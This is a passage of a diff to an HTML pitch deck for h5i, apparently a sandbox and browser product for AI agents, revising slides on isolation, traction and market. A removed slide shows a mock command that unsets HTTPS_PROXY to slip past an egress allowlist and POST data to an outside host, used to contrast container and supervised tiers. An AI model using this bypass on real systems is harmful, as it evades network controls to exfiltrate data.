-<span class="t-prompt">h5i:webapp$</span> <span class="t-cmd">agent-browser screenshot signup.png</span> <span class="t-pass">✓</span>
-  <span class="t-out">console</span> <span class="t-pass">0 errors</span> <span class="t-out">· 0 failed requests</span>
-<span class="t-cmt">the page's own answer, not the agent's summary</span></pre></div>
-      </div>
-      <div class="rc-list">
-        <div class="rc-ck"><span class="box">✓</span>Accessibility tree, not HTML</div>
-        <div class="rc-ck"><span class="box">✓</span>Screenshots on disk</div>
-        <div class="rc-ck"><span class="box">✓</span>Console errors in the receipt</div>
-        <div class="rc-ck"><span class="box">✓</span>Watch the same viewport</div>
-        <div class="rc-ck"><span class="box">✓</span>Take control, agent waits</div>
-        <div class="rc-ck"><span class="box">✓</span>No published port</div>
-      </div>
-    </div>
-
-    <p class="rc-sub">Your host browser never connects to the app. <b>The box's Chrome does.</b></p>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 8 — The output gate (h5i box export)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:20px;">
-  <div style="width:100%;max-width:1040px;">
-    <div class="section-tag">The output gate</div>
-    <h2>Nothing leaves the box<br><span class="red">without your review</span>.</h2>
-    <p class="lede" style="max-width:880px;">The agent has no direct write path to your repository. <code>h5i box export</code> is the only exit: the patch, a report of what ran and what was refused, the screenshots, and the receipt. You apply it, or you delete the box.</p>
-
-    <div class="terminal" style="margin-top:16px;">
-      <div class="terminal-bar">
-        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-        <span class="terminal-path">h5i box export</span>
-      </div>
-      <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">h5i box export webapp</span>
-<span class="t-pass">✔</span> <span class="t-bold">exported</span> <span class="t-out">env/you/webapp → h5i-export/webapp</span>
-
-  <span class="t-out">patch.diff</span>    <span class="t-bold">9 files</span>, <span class="t-pass">+214</span> <span class="t-red">-38</span>  <span class="t-cmt">· paths validated</span>
-  <span class="t-out">report.md</span>     <span class="t-bold">what ran</span>, what was denied, what was redacted
-  <span class="t-out">signup.png</span>    <span class="t-bold">the flow</span>, as the box's browser saw it
-  <span class="t-out">receipt.json</span>  <span class="t-bold">23 records</span> <span class="t-cmt">· with the enforced policy digest</span>
-  <span class="t-warn">egress</span>        <span class="t-red">2 denied attempt(s)</span> <span class="t-out">· read report.md before applying</span>
-
-<span class="t-cmt">$ git apply --3way h5i-export/webapp/patch.diff   # a human step, deliberately</span></pre></div>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 9 — The boundary (why a container is not the answer)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:20px;">
-  <div style="width:100%;max-width:1080px;">
-    <div class="section-tag">The boundary</div>
-    <h2>A container is one tier, and the <span class="red">weakest</span><br>at the thing that matters most.</h2>
-    <p class="lede" style="max-width:900px;">A container's egress allowlist is an HTTP proxy, so it only binds tooling that respects proxy settings. h5i's <code>supervised</code> tier puts the box in its own network namespace, enforces the allowlist with nftables rules pinned to resolved IPs, and gates <code>socket()</code> with seccomp.</p>
-
-    <div style="margin-top:18px;display:flex;align-items:center;gap:16px;">
-      <div style="flex:1;min-width:0;display:flex;flex-direction:column;gap:10px;">
-        <span class="pill red">container · L7</span>
-        <div class="terminal">
-          <div class="terminal-bar">
-            <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-            <span class="terminal-path">the allowlist is a proxy setting</span>
+    <div class="rt" style="margin-top:22px;" role="img" aria-label="Diagram: a loaded web page full of layout, images and ads enters the h5i browser on the left; a three-line outline with @ref handles comes out on the right. The agent drives the same session back through h5i.">
+      <div class="rt-col">
+        <span class="rt-cap">the web &#183; what a page loads</span>
+        <div class="pgm">
+          <div class="pgm-bar"><i></i><i></i><i></i><span class="pgm-url"></span></div>
+          <div class="pgm-body">
+            <div class="pgm-row">
+              <span class="pgm-logo"></span>
+              <span class="pgm-nav keep">Getting started</span>
+              <span class="pgm-nav dim">API</span>
+              <span class="pgm-nav dim">Blog</span>
+              <span style="flex:1;"></span>
+              <span class="pgm-search keep">Search &#9906;</span>
+            </div>
+            <div class="pgm-row"><span class="pgm-h1 keep">Documentation</span></div>
+            <div class="pgm-row"><span class="pgm-b" style="flex:3;"></span><span class="pgm-b" style="flex:2;"></span></div>
+            <div class="pgm-row">
+              <span class="pgm-b img" style="flex:1;"></span>
+              <div class="pgm-ad" style="flex:0 0 58px;">AD</div>
+            </div>
+            <div class="pgm-row"><span class="pgm-b" style="flex:4;"></span><span class="pgm-b" style="flex:1;"></span></div>
+            <div class="pgm-row">
+              <span class="pgm-b img" style="flex:1;"></span>
+              <span class="pgm-b img" style="flex:1;"></span>
+              <div class="pgm-ad" style="flex:0 0 58px;">TRACKER</div>
+            </div>
           </div>
-          <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">env -u HTTPS_PROXY node exfil.js</span>
-<span class="t-out">connecting to cdn-metrics.dev:443 …</span>
-<span class="t-out">POST /collect</span> <span class="t-red">200 OK</span>
-
-<span class="t-cmt">  the program never asked the proxy,</span>
-<span class="t-cmt">  so the allowlist was never consulted</span></pre></div>
         </div>
-        <span class="mono" style="font-size:0.95rem;color:var(--yellow);">binds proxy-respecting tooling only</span>
       </div>
 
-      <span class="red" style="flex-shrink:0;font-family:var(--mono);font-size:2.2rem;line-height:1;">⇒</span>
-
-      <div style="flex:1;min-width:0;display:flex;flex-direction:column;gap:10px;">
-        <span class="pill green">supervised · L3/L4</span>
-        <div class="terminal">
-          <div class="terminal-bar">
-            <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-            <span class="terminal-path">private netns · nftables · seccomp</span>
-          </div>
-          <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">env -u HTTPS_PROXY node exfil.js</span>
-<span class="t-out">connecting to cdn-metrics.dev:443 …</span>
-<span class="t-red">connect: Operation not permitted</span>
-
-<span class="t-cmt">  refused in the box's own network</span>
-<span class="t-cmt">  namespace · recorded as a denial</span></pre></div>
+      <div class="rt-mid">
+        <div class="rt-ar"><span class="ac">&#9656;&#9656;&#9656;</span><span class="al">page bytes</span></div>
+        <div class="bnode core" style="margin:8px 0;">
+          <span class="bt">one local binary</span>
+          <span class="bn">h5i browser</span>
         </div>
-        <span class="mono" style="font-size:0.95rem;color:var(--green);">no way around it from inside</span>
+        <div class="rt-ar"><span class="ac">&#9656;&#9656;&#9656;</span><span class="al">outline, not pixels</span></div>
+      </div>
+
+      <div class="rt-col">
+        <span class="rt-cap">the agent &#183; what it runs, and what comes back</span>
+        <div class="rt-term">
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+              <span class="terminal-path">the agent's session</span>
+            </div>
+            <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">h5i browser open https://docs.rs --allow docs.rs</span>
+<span class="t-prompt">$</span> <span class="t-cmd">h5i browser snapshot</span>
+  <span class="t-ai">@e1</span> <span class="t-out">heading "Documentation"</span>
+  <span class="t-ai">@e2</span> <span class="t-out">link "Getting started"</span>
+  <span class="t-ai">@e3</span> <span class="t-out">searchbox "Search"</span>
+<span class="t-prompt">$</span> <span class="t-cmd">h5i browser click @e2</span> <span class="t-pass">&#10003;</span></pre></div>
+          </div>
+        </div>
       </div>
     </div>
 
-    <p class="kicker" style="margin-top:18px;text-align:center;">Five tiers: <span class="mono">workspace · process · supervised · container · microvm</span>. The strongest boots its <span class="cyan">own kernel</span>. h5i never silently downgrades: a tier your host cannot satisfy <span class="red">fails closed</span>.</p>
+    <div class="rt-back">
+      <span class="ln"></span>
+      <span class="lb">&#9666; the agent drives the same session &#183; open &#183; click &#183; type</span>
+      <span class="ln r"></span>
+    </div>
+
+    <div class="g4" style="margin-top:16px;">
+      <div class="metric" style="padding:16px 14px;gap:4px;"><span class="mv" style="font-size:2.1rem;">~5&times;</span><span class="ml" style="font-size:0.88rem;">faster reads</span></div>
+      <div class="metric" style="padding:16px 14px;gap:4px;"><span class="mv" style="font-size:2.1rem;">~80%</span><span class="ml" style="font-size:0.88rem;">less peak memory</span></div>
+      <div class="metric" style="padding:16px 14px;gap:4px;"><span class="mv" style="font-size:2.1rem;">300k+</span><span class="ml" style="font-size:0.88rem;">web standards tests passed</span></div>
+      <div class="metric" style="padding:16px 14px;gap:4px;"><span class="mv" style="font-size:1.75rem;">Auditable</span><span class="ml" style="font-size:0.88rem;">every action is recorded</span></div>
+    </div>
   </div>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 10 — The fleet (many boxes, one read-only screen)
+     SLIDE 6 — The sandbox (the workflow loop inside one boundary)
 ══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:20px;">
-  <div style="width:100%;max-width:1080px;">
-    <div class="section-tag">At scale</div>
-    <h2><span class="red">Many boxes at once</span>, one screen.</h2>
-    <p class="lede" style="max-width:940px;">Boxes are cheap and disposable, so you run several. <code>h5i ui</code> shows the fleet: the policy each box actually enforced, what ran inside it, and what was refused. Read-only, loopback, token-gated. It counts receipts; it does not score anyone.</p>
+<div class="slide" style="gap:16px;">
+  <div style="width:100%;max-width:1120px;">
+    <div class="section-tag">The sandbox</div>
+    <h2>Put the agent&#39;s entire workflow<br>inside <span class="red">one boundary</span>.</h2>
+    <p class="lede" style="max-width:960px;">Turn agent permission prompts off: the box is the permission. Writes stay in <code>$WORK</code>, egress is allowlisted, every denial is recorded, and an everyday box is ready in under 200&nbsp;ms.</p>
 
-    <img class="team-svg" src="/_static/sandbox-ui-demo.png" width="2293" height="901" loading="lazy" alt="The h5i box console: every box in the fleet with its isolation tier, profile, enforced policy, recent commands and denied egress attempts, on one read-only screen.">
+    <div class="sbx" role="img" aria-label="Diagram: host files and credentials, internal services and unapproved websites are blocked at the sandbox wall. Inside, the agent, its code and dependencies, the dev server and the h5i browser run as one loop. Only a reviewed patch, a report and an execution record leave on export.">
+    <div class="sbx-side">
+      <span class="sbx-h no">stays outside</span>
+      <div class="sbx-item no">Host files and credentials</div>
+      <div class="sbx-item no">Internal services</div>
+      <div class="sbx-item no">Unapproved websites</div>
+    </div>
+      <div class="sbx-gate no">
+        <span class="g-ar">&#10005;&#9656;</span>
+        <span class="g-lb">blocked</span>
+      </div>
+      <div class="sb-box">
+        <div class="sb-label">&#128737;&#65039; sandbox &#183; one boundary</div>
+        <div class="sbl">
+          <div class="sbl-n">Agent</div>
+          <div class="sbl-a">&#9656;</div>
+          <div class="sbl-n">Code and<br>dependencies</div>
+          <div class="sbl-a">&#9650;</div>
+          <div></div>
+          <div class="sbl-a">&#9660;</div>
+          <div class="sbl-n core">h5i browser</div>
+          <div class="sbl-a">&#9666;</div>
+          <div class="sbl-n">Dev server</div>
+        </div>
+      </div>
+      <div class="sbx-gate ok">
+        <span class="g-ar">&#9656;</span>
+        <span class="g-lb">on export</span>
+      </div>
+    <div class="sbx-side">
+      <span class="sbx-h ok">only these leave</span>
+      <div class="sbx-item ok">Reviewed patch</div>
+      <div class="sbx-item ok">Report</div>
+      <div class="sbx-item ok">Execution record</div>
+    </div>
+    </div>
+
+    <p class="sb-payoff">The agent <b>still finishes the task</b>. Only the <span class="green">reviewed patch</span> is merged.</p>
   </div>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 11 — Traction
+     SLIDE 7 — Traction
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:24px;">
   <div style="width:100%;max-width:1000px;">
@@ -1116,9 +1162,9 @@
     <h2>Agent-heavy developers are<br>already <span class="red">pulling</span> this.</h2>
 
     <div class="g4" style="margin-top:24px;">
-      <div class="metric"><span class="mv">500+</span><span class="ml">GitHub stars</span></div>
-      <div class="metric"><span class="mv">45+</span><span class="ml">forks</span></div>
-      <div class="metric"><span class="mv">14</span><span class="ml">contributors</span></div>
+      <div class="metric"><span class="mv">580+</span><span class="ml">GitHub stars</span></div>
+      <div class="metric"><span class="mv">50+</span><span class="ml">forks</span></div>
+      <div class="metric"><span class="mv">20+</span><span class="ml">contributors</span></div>
       <div class="metric"><span class="mv">20+</span><span class="ml">releases since March</span></div>
       <!--<div class="metric"><span class="mv"><a href="https://news.ycombinator.com/item?id=48345837" target="_blank" rel="noopener" style="color:inherit;text-decoration:none;">Trending</a></span><span class="ml">on Hacker News</span></div>-->
     </div>
@@ -1126,88 +1172,84 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 12 — Beachhead (who buys first)
+     SLIDE 8 — Beachhead (who buys first)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:22px;">
-  <div style="width:100%;max-width:1040px;">
+  <div style="width:100%;max-width:1120px;">
     <div class="section-tag">Beachhead</div>
-    <h2>Teams running agents faster<br>than they can <span class="red">safely supervise</span> them.</h2>
-    <p class="lede" style="max-width:900px;">We spoke with dozens of developers during PhD research in AI and systems security. The repeated bottleneck was not code generation. It was <span class="cyan">autonomy they could afford to grant</span>.</p>
+    <h2>Start with developers already giving<br>agents <span class="red">browser access</span>.</h2>
+    <p class="lede" style="max-width:940px;font-size:1.3rem;">Developers already use agents to browse and test web apps. Now they need a <span class="cyan">safer, lighter way to run more sessions</span>.</p>
 
-    <div style="margin-top:24px;display:flex;flex-direction:column;gap:16px;">
+    <div style="margin-top:20px;display:flex;flex-direction:column;gap:14px;">
       <div class="feat-card" style="border-color:rgba(98,201,140,0.4);background:rgba(98,201,140,0.05);display:flex;flex-direction:column;gap:6px;">
-        <span class="pill green" style="align-self:flex-start;">beachhead · buys first</span>
-        <span class="feat-cmd" style="display:block;font-size:1.9rem;line-height:1.15;color:var(--green);">Agent-heavy engineering</span>
-        <p class="feat-desc" style="font-size:1.15rem;">Already using Claude Code, Codex, Cursor, or internal agents, and either babysitting them or running them wide open.</p>
+        <span class="pill green" style="align-self:flex-start;">beachhead &#183; buys first</span>
+        <span class="feat-cmd" style="display:block;border:0;background:none;padding:0; font-size:1.6rem;line-height:1.15;color:var(--green);">Developers building browser-enabled agents</span>
+        <p class="feat-desc" style="font-size:1.05rem;">Need fast local browsing, structured page output, safe web app testing, and records they can review.</p>
       </div>
 
       <div style="display:flex;flex-direction:column;gap:10px;">
-        <span class="mono" style="font-size:0.78rem;letter-spacing:0.16em;text-transform:uppercase;color:var(--cyan);">Expansion →</span>
-        <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;align-items:stretch;">
-          <div class="feat-card"><span class="feat-cmd" style="display:block;font-size:1.35rem;line-height:1.15;color:var(--cyan);">Platform / DevEx</span><p class="feat-desc" style="margin-top:8px;">One standard box agents run in, on a laptop or on CI.</p></div>
-          <div class="feat-card"><span class="feat-cmd" style="display:block;font-size:1.35rem;line-height:1.15;color:var(--cyan);">Security</span><p class="feat-desc" style="margin-top:8px;">Contained autonomy, with a record of every refused action.</p></div>
-          <div class="feat-card"><span class="feat-cmd" style="display:block;font-size:1.35rem;line-height:1.15;color:var(--cyan);">Untrusted code</span><p class="feat-desc" style="margin-top:8px;">Run an unreviewed PR or an unknown repository off your machine.</p></div>
+        <span class="mono" style="font-size:0.78rem;letter-spacing:0.16em;text-transform:uppercase;color:var(--cyan);">Expansion &rarr;</span>
+        <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:14px;align-items:stretch;">
+          <div class="feat-card"><span class="feat-cmd" style="display:block;border:0;background:none;padding:0;font-size:1.25rem;line-height:1.2;color:var(--cyan);">Agent platforms</span><p class="feat-desc" style="margin-top:8px;font-size:1rem;">Run many concurrent browser sessions with lower memory use.</p></div>
+          <div class="feat-card"><span class="feat-cmd" style="display:block;border:0;background:none;padding:0;font-size:1.25rem;line-height:1.2;color:var(--cyan);">Platform and DevEx teams</span><p class="feat-desc" style="margin-top:8px;font-size:1rem;">Provide one isolated browser and testing workflow across developer laptops.</p></div>
+          <div class="feat-card"><span class="feat-cmd" style="display:block;border:0;background:none;padding:0;font-size:1.25rem;line-height:1.2;color:var(--cyan);">Security teams</span><p class="feat-desc" style="margin-top:8px;font-size:1rem;">Restrict browser access, keep credentials outside the agent.</p></div>
         </div>
       </div>
     </div>
+
+    <p class="mono" style="margin-top:18px;font-size:0.82rem;color:var(--text-dim);">Based on dozens of developer interviews during PhD research in AI and systems security.</p>
+    </div>
   </div>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 13 — Why h5i wins (the acceptance layer)
+     SLIDE 9 — Why h5i wins (the acceptance layer)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:22px;">
-  <div style="width:100%;max-width:1000px;">
+  <div style="width:100%;max-width:1080px;">
     <div class="section-tag">Why h5i wins</div>
-    <h2>h5i wins by becoming the <span class="red">default place</span> agent teams meet.</h2>
-    <p class="lede" style="max-width:900px;">Agents will run longer, less supervised, on more machines, and increasingly in groups. The layer where they coordinate becomes the control point, because it is the one place authority is handed over by accident.</p>
+    <h2>Other browsers solve speed <span class="red">or</span> security.<br>h5i solves <span class="red">both</span>.</h2>
 
-    <div class="ladder" style="margin-top:22px;">
-      <div class="rung"><span class="rk">Coding agents</span><span class="rv">generate patches.</span></div>
-      <div class="rung"><span class="rk">Process sandboxes</span><span class="rv">confine one command at a time.</span></div>
-      <div class="rung"><span class="rk">Devcontainers</span><span class="rv">give you an environment, not a boundary.</span></div>
-      <div class="rung"><span class="rk">VM sandboxes</span><span class="rv">isolate, at minutes, gigabytes, and someone else's servers.</span></div>
-      <div class="rung"><span class="rk">Agent frameworks</span><span class="rv">let agents talk, by giving each one a token and a route.</span></div>
-      <div class="rung h5i"><span class="rk">h5i</span><span class="rv"><strong style="color:var(--ink);">puts each agent in a local boundary that starts in milliseconds, and puts them all on one forum that carries information and no authority.</strong></span></div>
+    <div class="ladder" style="margin-top:26px;">
+      <div class="rung"><span class="rk" style="min-width:290px;">Conventional browser automation</span><span class="rv">Built for people, so it is slow, memory-heavy, difficult to audit, and exposes more access than agents need.</span></div>
+      <div class="rung"><span class="rk" style="min-width:290px;">Lightweight browsers</span><span class="rv">Reduce startup time and memory, but do not limit what a manipulated agent can access or send.</span></div>
+      <div class="rung"><span class="rk" style="min-width:290px;">Sandboxing an existing browser</span><span class="rv">Reduces risk, but keeps the cost and complexity of a browser built for people.</span></div>
+      <div class="rung h5i"><span class="rk" style="min-width:290px;">h5i</span><span class="rv"><strong style="color:var(--ink);">~5&times; faster reads and ~80% less peak memory on simple websites, with request records, network controls, and sandboxing built in.</strong></span></div>
     </div>
 
-    <p class="kicker" style="margin-top:18px;text-align:center;">The scarce resource is no longer code generation. It is <span class="red">autonomy you can afford to grant</span>, to more than one of them at once.</p>
+    <p class="kicker" style="margin-top:22px;text-align:center;font-size:1.15rem;">Fast enough to <span class="red">run more sessions</span>. Controlled enough to <span class="red">grant more autonomy</span>.</p>
   </div>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 14 — Why now / why us (team + 12-week plan)
+     SLIDE 10 — Why now / why us (team + 12-week plan)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:20px;">
   <div class="hero-glow"></div>
   <div style="width:100%;max-width:1060px;">
     <div class="section-tag">Why now · why us</div>
-    <h2>We will make h5i the <span class="red">default browser</span><br>an agent reaches for.</h2>
+    <h2>We are making h5i the <span class="red">default browser</span><br>for AI agents.</h2>
 
     <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:26px;text-align:left;align-items:stretch;">
       <div class="feat-card">
-        <span class="feat-cmd" style="display:block;font-size:1.25rem;color:var(--cyan);">Why this exists</span>
+        <span class="feat-cmd" style="display:block;border:0;background:none;padding:0; font-size:1.25rem;color:var(--cyan);">Why now</span>
         <ul style="margin:12px 0 0;padding:0;list-style:none;display:flex;flex-direction:column;gap:9px;">
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--cyan);">▸</span>PhD research in AI + systems security.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--cyan);">▸</span>Dozens of developer conversations on agent autonomy, sandboxing, and what people actually let an agent touch.</li>
+          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--cyan);">&#9656;</span>Agents are increasingly browsing websites and testing web apps with less human supervision.</li>
+          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--cyan);">&#9656;</span>Existing browsers make teams choose between performance and control.</li>
         </ul>
       </div>
       <div class="feat-card">
-        <span class="feat-cmd" style="display:block;font-size:1.25rem;color:var(--green);">Built already</span>
+        <span class="feat-cmd" style="display:block;border:0;background:none;padding:0; font-size:1.25rem;color:var(--green);">Why us</span>
         <ul style="margin:12px 0 0;padding:0;list-style:none;display:flex;flex-direction:column;gap:9px;">
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--green);">▸</span>500+ GitHub stars, 20+ releases.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--green);">▸</span>Five isolation tiers on Linux and macOS, one Rust binary.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--green);">&#9656;</span>Our own engine, with fail-closed request records and human takeover.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--green);">▸</span>A Git-backed forum, verified across mixed isolation tiers.</li>
+          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--green);">&#9656;</span>500+ GitHub stars, 20+ contributors, and third-party tools built by users.</li>
+          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--green);">&#9656;</span>Grounded in PhD research and dozens of developer interviews on agent security.</li>
         </ul>
       </div>
       <div class="feat-card">
-        <span class="feat-cmd" style="display:block;font-size:1.25rem;color:var(--yellow);">Next 12 weeks</span>
+        <span class="feat-cmd" style="display:block;border:0;background:none;padding:0; font-size:1.25rem;color:var(--yellow);">Next 12 weeks</span>
         <ul style="margin:12px 0 0;padding:0;list-style:none;display:flex;flex-direction:column;gap:9px;">
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--yellow);">&#9656;</span>Hold a resident session on every tier that enforces egress.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--yellow);">▸</span>Boot the microVM tier on real virtualization hosts.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--yellow);">▸</span>Convert 10 design partners.</li>
-          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--yellow);">▸</span>Land first paid pilots.</li>
+          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--yellow);">&#9656;</span>Expand website compatibility and ship the read-only dashboard.</li>
+          <li class="feat-desc" style="position:relative;padding-left:1.2em;"><span style="position:absolute;left:0;color:var(--yellow);">&#9656;</span>Convert 10 design partners and land the first paid pilots.</li>
         </ul>
       </div>
     </div>
